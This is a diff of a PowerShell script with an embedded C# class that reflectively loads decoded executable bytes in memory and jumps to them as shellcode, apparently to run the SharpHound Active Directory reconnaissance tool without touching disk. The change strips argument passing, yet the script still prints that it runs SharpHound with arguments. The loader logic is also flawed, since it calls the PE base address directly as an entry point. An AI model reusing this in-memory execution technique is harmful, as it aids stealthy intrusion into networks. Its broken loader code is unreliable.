@@ -33,22 +33,22 @@ public class PELoader
     public delegate IntPtr LoadLibraryDelegate(string name);
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate void RunPE(string arguments);
+    public delegate void RunPE();
 
-    public static void Execute(IntPtr mem, string arguments)
+    public static void Execute(IntPtr mem)
     {
-        // Simple PE loader logic (this will vary based on actual implementation needs)
+        IntPtr pe = mem;
         IntPtr shellcode = mem; // Adjust this based on actual offset calculations
 
         RunPE run = (RunPE)Marshal.GetDelegateForFunctionPointer(shellcode, typeof(RunPE));
-        run(arguments);
+        run();
     }
 }
 "@
         Add-Type -TypeDefinition $PELoader -Language CSharp
     }
 
-    [PELoader]::Execute($mem, $Arguments)
+    [PELoader]::Execute($mem)
 
     # Free the allocated memory
     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
@@ -61,6 +61,6 @@ $outputDirectory = (Get-Location).Path
 $arguments = "-c All -o $outputDirectory"
 
 # Invoke the reflective PE loader function with the decoded executable bytes and arguments
-Invoke-ReflectivePE -PEBytes $exeBytes -Arguments $arguments
+Invoke-ReflectivePE -PEBytes $exeBytes
 
 Write-Host "Running SharpHound with arguments: $arguments"
